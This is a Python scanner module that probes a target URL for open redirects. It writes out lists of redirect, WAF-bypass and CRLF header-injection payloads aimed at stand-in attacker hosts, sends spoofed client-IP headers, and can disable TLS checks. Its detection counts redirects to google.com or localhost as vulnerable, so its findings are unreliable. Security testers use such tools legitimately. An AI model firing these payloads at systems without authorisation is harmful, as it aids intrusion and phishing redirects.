#!/usr/bin/env python3
import requests
import re
import random
import time
import urllib3
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote, unquote
from typing import List, Dict, Any, Optional, Set
from .vulnerability_base import VulnerabilityModule
from config import settings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Scanner(VulnerabilityModule):
    name = "open_redirect_probe"
    enabled = True
    timeout = getattr(settings, "TIMEOUT", 8)
    user_agent = getattr(settings, "USER_AGENT", "QX-Scanner/3.0")
    aggressive = getattr(settings, "AGGRESSIVE", False)
    debug_mode = getattr(settings, "DEBUG", False)
    max_redirects = getattr(settings, "MAX_REDIRECTS", 5)
    REDIRECT_PARAMS = [
        "url", "redirect", "next", "continue", "return",
        "dest", "destination", "go", "jump", "target",
        "rurl", "forward", "redirect_url", "redirect_to",
        "callback", "return_url", "return_to", "login",
        "logout", "exit", "link", "href", "uri", "path",
        "from", "to", "out", "image", "src", "file"
    ]
    TEST_DOMAINS = [
        "https://evil.example.com",
        "http://malicious.test",
        "//attacker.com",
        "https://google.com",
        "http://localhost:8000",
        "https://127.0.0.1:8080",
        "https://example.com.evil.com",
        "https://google.com@evil.com",
        "https://evil.com//google.com",
        "https://evil.com/?",
        "http://evil.com#@google.com",
        "https://evil.com\\@google.com",
        "https://evil.com/.google.com"
    ]
    BYPASS_PAYLOADS = [
        "////evil.com/@",
        "/\\/\\evil.com",
        "https:/\\/evil.com",
        "http://localhost:80@evil.com",
        "https://google.com%00@evil.com",
        "https://google.com%0a@evil.com",
        "https://google.com%0d@evil.com",
        "https://google.com%09@evil.com",
        "https://google.com%23@evil.com",
        "https://google.com%3f@evil.com",
        "https://google.com%3a@evil.com",
        "https://google.com%2f@evil.com",
        "https://google.com%5c@evil.com",
        "https://google.com%2e@evil.com",
        "https://google.com%252e@evil.com",
        "https://google.com%ff@evil.com",
        "https://google.com%0d%0a@evil.com",
        "https://google.com%0a%0d@evil.com",
        "https://google.com%0d%0a%0d%0a@evil.com",
        "https://google.com?@evil.com",
        "https://google.com#@evil.com",
        "https://google.com:@evil.com",
        "https://google.com/\\@evil.com",
        "https://google.com/\/@evil.com",
        "https://google.com/;/@evil.com",
        "https://google.com/./@evil.com",
        "https://google.com/../@evil.com",
        "https://google.com/.../@evil.com"
    ]
    AGGRESSIVE_PAYLOADS = [
        "https://google.com%0d%0aLocation:%20https://evil.com",
        "https://google.com%0d%0aRefresh:%20https://evil.com",
        "https://google.com%0d%0aX-Forwarded-Host:%20evil.com",
        "https://google.com%0d%0aX-Real-IP:%20evil.com",
        "https://google.com%0d%0aX-Original-URL:%20https://evil.com",
        "https://google.com%0d%0aX-Rewrite-URL:%20https://evil.com",
        "https://google.com%0d%0aX-Forwarded-Server:%20evil.com",
        "https://google.com%0d%0aX-Forwarded-Proto:%20https",
        "https://google.com%0d%0aX-Client-IP:%20evil.com",
        "https://google.com%0d%0aX-Host:%20evil.com",
        "https://google.com%0d%0aX-Forwarded-For:%20evil.com",
        "https://google.com%0d%0aReferer:%20https://evil.com",
        "https://google.com%0d%0aOrigin:%20https://evil.com",
        "https://google.com%0d%0aHost:%20evil.com",
        "https://google.com%0d%0aX-Requested-With:%20XMLHttpRequest",
        "https://google.com%0d%0aX-CSRF-Token:%20bypass",
        "https://google.com%0d%0aX-XSRF-Token:%20null",
        "https://google.com%0d%0aCookie:%20redirect_to=https://evil.com",
        "https://google.com%0d%0aAuthorization:%20Bearer%20evil_token",
        "https://google.com%0d%0aContent-Type:%20text/html",
        "https://google.com%0d%0aAccept:%20text/html",
        "https://google.com%0d%0aUser-Agent:%20Mozilla/5.0%20(compatible;%20RedirectScanner/1.0)",
        "https://google.com%0d%0aX-HTTP-Method-Override:%20GET",
        "https://google.com%0d%0aX-Method-Override:%20GET",
        "https://google.com%0d%0aX-CSRF-Key:%20bypass123",
        "https://google.com%0d%0aX-Auth-Token:%20admin",
        "https://google.com%0d%0aX-API-Key:%20evil_key",
        "https://google.com%0d%0aX-Request-ID:%201337",
        "https://google.com%0d%0aX-Correlation-ID:%201337",
        "https://google.com%0d%0aX-Request-Start:%201337",
        "https://google.com%0d%0aX-Request-Time:%201337",
        "https://google.com%0d%0aX-Response-Time:%201337",
        "https://google.com%0d%0aX-Process-Time:%201337",
        "https://google.com%0d%0aX-Powered-By:%20PHP/7.4",
        "https://google.com%0d%0aX-AspNet-Version:%204.0.30319",
        "https://google.com%0d%0aX-AspNetMvc-Version:%205.2",
        "https://google.com%0d%0aServer:%20Apache/2.4.41",
        "https://google.com%0d%0aVia:%201.1%20evil.com",
        "https://google.com%0d%0aX-Cache:%20MISS",
        "https://google.com%0d%0aX-Cache-Hits:%200",
        "https://google.com%0d%0aX-Content-Type-Options:%20nosniff",
        "https://google.com%0d%0aX-Frame-Options:%20ALLOW-FROM%20https://evil.com",
        "https://google.com%0d%0aX-XSS-Protection:%200",
        "https://google.com%0d%0aContent-Security-Policy:%20default-src%20*%20'unsafe-inline'%20'unsafe-eval'",
        "https://google.com%0d%0aStrict-Transport-Security:%20max-age=0",
        "https://google.com%0d%0aFeature-Policy:%20geolocation%20*",
        "https://google.com%0d%0aPermissions-Policy:%20geolocation=*",
        "https://google.com%0d%0aX-Permitted-Cross-Domain-Policies:%20all",
        "https://google.com%0d%0aX-Download-Options:%20noopen",
        "https://google.com%0d%0aX-DNS-Prefetch-Control:%20off"
    ]
    WAF_BYPASS_PAYLOADS = [
        "https://google.com%252f%252fevil.com",
        "https://google.com%255c%255cevil.com",
        "https://google.com%252eevil.com",
        "https://google.com%25252eevil.com",
        "https://google.com%25252fevil.com",
        "https://google.com%25255cevil.com",
        "https://google.com%u002f%u002fevil.com",
        "https://google.com%u005c%u005cevil.com",
        "https://google.com%u002eevil.com",
        "https://google.com%u00252eevil.com",
        "https://google.com%u00252fevil.com",
        "https://google.com%u00255cevil.com",
        "https://google.com%U002f%U002fevil.com",
        "https://google.com%U005c%U005cevil.com",
        "https://google.com%U002eevil.com",
        "https://google.com%00evil.com",
        "https://google.com%0aevil.com",
        "https://google.com%0devil.com",
        "https://google.com%09evil.com",
        "https://google.com%0bevil.com",
        "https://google.com%0cevil.com",
        "https://google.com%20evil.com",
        "https://google.com%7fevil.com",
        "https://google.com%ffevil.com",
        "https://google.com%f0%80%80%80evil.com",
        "https://google.com%f0%80%80%81evil.com",
        "https://google.com%f0%80%80%82evil.com",
        "https://google.com%f0%80%80%83evil.com",
        "https://google.com%f0%80%80%84evil.com",
        "https://google.com%f0%80%80%85evil.com"
    ]
    
    def __init__(self, *args, **kwargs):
        target = None
        session = None
        timeout = 8
        debug = False
        aggressive = False
        stealth = None
        
        if len(args) >= 1:
            target = args[0]
        if len(args) >= 2:
            session = args[1]
        if len(args) >= 3:
            timeout = args[2]
        if len(args) >= 4:
            debug = args[3]
            
        if 'target' in kwargs:
            target = kwargs['target']
        if 'session' in kwargs:
            session = kwargs['session']
        if 'timeout' in kwargs:
            timeout = kwargs['timeout']
        if 'debug' in kwargs:
            debug = kwargs['debug']
        if 'aggressive' in kwargs:
            aggressive = kwargs['aggressive']
        if 'stealth' in kwargs:
            stealth = kwargs['stealth']
            
        if session is None:
            session = requests.Session()
            
        self.target = target
        self.session = session
        self.timeout = timeout
        self.debug_mode = debug
        self.aggressive = aggressive
        
        if stealth is not None:
            self.bypass_protection = stealth
        else:
            self.bypass_protection = False
            
        if self.bypass_protection:
            self.session.verify = False
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
        self.custom_payloads = kwargs.get('custom_payloads', [])
        if getattr(settings, "USE_PROXY", False):
            proxy_config = getattr(settings, "PROXY_SETTINGS", {})
            self.session.proxies.update(proxy_config)
        if self.aggressive:
            self.max_redirects = 10
            self.timeout = 15
            
    def _configure_session(self) -> None:
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if self.aggressive:
            headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": self.target,
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRF-Token": "random_token_bypass",
                "X-Request-ID": f"{random.randint(1000000,9999999)}",
                "X-Correlation-ID": f"{random.randint(1000000,9999999)}"
            })
        self.session.headers.update(headers)
        
    def _build_test_cases(self) -> List[Dict[str, str]]:
        parsed = urlparse(self.target)
        queries = dict(parse_qsl(parsed.query))
        test_cases = []
        param_priority = []
        for param in queries:
            if param.lower() in self.REDIRECT_PARAMS:
                param_priority.append((param, 0))
            else:
                param_priority.append((param, 1))
        param_priority.sort(key=lambda x: x[1])
        for param, _ in param_priority[:12]:
            for domain in self.TEST_DOMAINS:
                new_query = queries.copy()
                new_query[param] = domain
                test_url = parsed._replace(query=urlencode(new_query, doseq=True))
                test_cases.append({
                    "url": urlunparse(test_url),
                    "param": param,
                    "payload": domain,
                    "vector": "query_direct"
                })
            for bypass in self.BYPASS_PAYLOADS + self.WAF_BYPASS_PAYLOADS:
                new_query_bypass = queries.copy()
                new_query_bypass[param] = bypass
                test_url_bypass = parsed._replace(query=urlencode(new_query_bypass, doseq=True))
                test_cases.append({
                    "url": urlunparse(test_url_bypass),
                    "param": param,
                    "payload": bypass,
                    "vector": "query_bypass"
                })
            if self.aggressive:
                for aggressive_payload in self.AGGRESSIVE_PAYLOADS:
                    new_query_aggressive = queries.copy()
                    new_query_aggressive[param] = aggressive_payload
                    test_url_aggressive = parsed._replace(query=urlencode(new_query_aggressive, doseq=True))
                    test_cases.append({
                        "url": urlunparse(test_url_aggressive),
                        "param": param,
                        "payload": aggressive_payload,
                        "vector": "query_aggressive"
                    })
            if self.aggressive and self.custom_payloads:
                for custom_payload in self.custom_payloads:
                    new_query_custom = queries.copy()
                    new_query_custom[param] = custom_payload
                    test_url_custom = parsed._replace(query=urlencode(new_query_custom, doseq=True))
                    test_cases.append({
                        "url": urlunparse(test_url_custom),
                        "param": param,
                        "payload": custom_payload,
                        "vector": "query_custom"
                    })
        if not test_cases or self.aggressive:
            base_url = self.target.rstrip("/")
            for param in self.REDIRECT_PARAMS[:15]:
                for domain in self.TEST_DOMAINS[:8]:
                    test_cases.append({
                        "url": f"{base_url}?{param}={quote(domain)}",
                        "param": param,
                        "payload": domain,
                        "vector": "query_added"
                    })
                    encoded_domain = quote(domain, safe='')
                    test_cases.append({
                        "url": f"{base_url}?{param}={encoded_domain}",
                        "param": param,
                        "payload": encoded_domain,
                        "vector": "query_encoded"
                    })
                for bypass in self.BYPASS_PAYLOADS[:10] + self.WAF_BYPASS_PAYLOADS[:10]:
                    test_cases.append({
                        "url": f"{base_url}?{param}={bypass}",
                        "param": param,
                        "payload": bypass,
                        "vector": "query_bypass_added"
                    })
                if self.aggressive:
                    for aggressive_payload in self.AGGRESSIVE_PAYLOADS[:20]:
                        test_cases.append({
                            "url": f"{base_url}?{param}={aggressive_payload}",
                            "param": param,
                            "payload": aggressive_payload,
                            "vector": "query_aggressive_added"
                        })
        return test_cases[:80] if not self.aggressive else test_cases[:300]
        
    def _check_redirect_chain(self, response, original_payload: str) -> Dict[str, Any]:
        redirect_chain = []
        current_response = response
        redirect_count = 0
        while current_response.is_redirect and redirect_count < self.max_redirects:
            redirect_count += 1
            location = current_response.headers.get("Location", "")
            redirect_chain.append({
                "status_code": current_response.status_code,
                "location": location,
                "redirect_number": redirect_count
            })
            if any(test_domain in location.lower() for test_domain in [d.lower() for d in self.TEST_DOMAINS]):
                return {
                    "vulnerable": True,
                    "redirect_chain": redirect_chain,
                    "final_location": location,
                    "redirects_count": redirect_count
                }
            try:
                current_response = self.session.get(
                    location,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False
                )
            except requests.RequestException:
                break
        return {
            "vulnerable": False,
            "redirect_chain": redirect_chain,
            "redirects_count": redirect_count
        }
        
    def _execute_test(self, test_case: Dict[str, str]) -> Dict[str, Any]:
        try:
            time.sleep(random.uniform(0.1, 0.3))
            response = self.session.get(
                test_case["url"],
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            location = response.headers.get("Location", "")
            content = response.text.lower()
            immediate_vulnerable = any(
                test_domain in location.lower() or test_domain in content
                for test_domain in [d.lower() for d in self.TEST_DOMAINS]
            )
            result = {
                **test_case,
                "status_code": response.status_code,
                "location_header": location,
                "content_length": len(response.content),
                "immediate_vulnerable": immediate_vulnerable,
                "content_type": response.headers.get("Content-Type", "")
            }
            if response.is_redirect and not immediate_vulnerable:
                chain_analysis = self._check_redirect_chain(response, test_case["payload"])
                result.update(chain_analysis)
            else:
                result["vulnerable"] = immediate_vulnerable
            if self.debug_mode and result.get("vulnerable", False):
                print(f"[DEBUG] Open redirect found: {test_case['url']}")
            return result
        except requests.RequestException as e:
            if self.debug_mode:
                print(f"[DEBUG] Request failed: {test_case['url']} - {e}")
            return {**test_case, "error": str(e)}
            
    def _validate_vulnerability(self, result: Dict[str, Any]) -> bool:
        if not result.get("vulnerable", False):
            return False
            
        url = result.get("url", "")
        location = result.get("location_header", "")
        final_location = result.get("final_location", "")
        
        vulnerable_indicators = [
            any(test_domain in location.lower() for test_domain in [d.lower() for d in self.TEST_DOMAINS]),
            any(test_domain in final_location.lower() for test_domain in [d.lower() for d in self.TEST_DOMAINS])
        ]
        
        if any(vulnerable_indicators):
            if location and result.get("status_code", 0) in [301, 302, 303, 307, 308]:
                return True
                
            if final_location and result.get("redirects_count", 0) > 0:
                return True
                
        return False
        
    def scan(self) -> Dict[str, Any]:
        try:
            self._configure_session()
            if self.debug_mode:
                print(f"[DEBUG] Starting open redirect scan for: {self.target}")
                print(f"[DEBUG] Aggressive mode: {self.aggressive}")
                print(f"[DEBUG] Custom payloads: {len(self.custom_payloads)}")
                
            evidence = []
            vulnerable_count = 0
            potential_count = 0
            total_tested = 0
            
            test_cases = self._build_test_cases()
            if self.debug_mode:
                print(f"[DEBUG] Generated {len(test_cases)} test cases for open redirect")
                
            for i, test_case in enumerate(test_cases):
                if self.debug_mode and i % 25 == 0:
                    print(f"[DEBUG] Testing case {i+1}/{len(test_cases)}")
                    
                result = self._execute_test(test_case)
                total_tested += 1
                
                if self._validate_vulnerability(result):
                    vulnerable_count += 1
                    evidence.append(result)
                    if self.debug_mode:
                        print(f"[VULNERABLE] Found open redirect: {test_case['url']}")
                elif result.get("immediate_vulnerable", False):
                    potential_count += 1
                    if result.get("status_code", 0) in [301, 302, 303, 307, 308]:
                        evidence.append(result)
                        
            risk = "low"
            if vulnerable_count > 0:
                risk = "critical" if vulnerable_count > 2 else "high"
            elif potential_count > 0:
                risk = "medium"
                
            return {
                "ok": True,
                "risk": risk,
                "vulnerable_count": vulnerable_count,
                "potential_count": potential_count,
                "total_tests": total_tested,
                "evidence": evidence,
                "notes": f"Tests performed: {total_tested}, Vulnerabilities found: {vulnerable_count}, Potential: {potential_count}",
                "stats": {
                    "tests_performed": total_tested,
                    "vulnerable_cases": vulnerable_count,
                    "potential_cases": potential_count,
                    "aggressive_mode": self.aggressive
                }
            }
        except Exception as e:
            if self.debug_mode:
                print(f"[CRITICAL ERROR] {str(e)}")
            return {
                "ok": False,
                "risk": "unknown",
                "error": str(e),
                "vulnerable_count": 0,
                "potential_count": 0,
                "total_tests": 0
            }
            
    def run(self) -> Dict[str, Any]:
        return self.scan()
